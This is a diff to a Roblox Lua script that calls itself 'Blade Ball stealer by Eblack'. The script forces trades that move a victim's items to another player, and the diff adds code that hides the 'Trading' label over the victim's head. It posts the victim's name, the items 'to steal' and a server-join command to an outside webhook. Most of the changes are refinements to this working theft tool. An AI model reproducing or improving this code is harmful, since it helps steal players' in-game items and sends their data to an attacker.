@@ -75,6 +75,7 @@ end)
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
+        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -92,7 +93,7 @@ end)
 local function sendTradeRequest(user)
     local target = game:GetService("Players"):WaitForChild(user)
     repeat
-        wait(0.1)
+        task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
     until response == true
 end
@@ -105,26 +106,26 @@ end
 
 local function readyTrade()
     repeat
-        wait(0.1)
+        task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
     until response == true
 end
 
 local function confirmTrade()
     repeat
-        wait(0.1)
+        task.wait(0.1)
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
     until not inTrade
 end
 
 local function formatNumber(number)
     if number == nil then return "0" end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -138,6 +139,7 @@ local totalRAP = 0
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
+    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
     local embedColor = isGoodHit and 65280 or 8323327
 
     local fields = {
@@ -166,6 +168,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
+        ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = embedTitle,
@@ -180,14 +183,15 @@ end
 local function SendMessage(list)
     local isGoodHit = totalRAP >= 500
     local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
+    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
     local embedColor = isGoodHit and 65280 or 8323327
 
     local fields = {
-		{name = "Victim Username 🤖:", value = plr.Name, inline = true},
-		{name = "Status 📈:", value = statusText, inline = true},
-		{name = "Items to Steal 📝:", value = "", inline = false},
+        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
+        {name = "Status 📈:", value = statusText, inline = true},
+        {name = "Items to Steal 📝:", value = "", inline = false},
         {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
-	}
+    }
 
     local grouped = {}
     for _, item in ipairs(list) do
@@ -208,11 +212,12 @@ local function SendMessage(list)
     end
 
     local data = {
+        ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
             ["color"] = embedColor,
-			["fields"] = fields,
-			["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
+            ["fields"] = fields,
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
@@ -271,7 +276,7 @@ if #itemsToSend > 0 then
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
-            repeat wait(0.5) until inTrade
+            repeat task.wait(0.5) until inTrade
 
             local currentBatch = getNextBatch(itemsToSend, 100)
             for _, item in ipairs(currentBatch) do
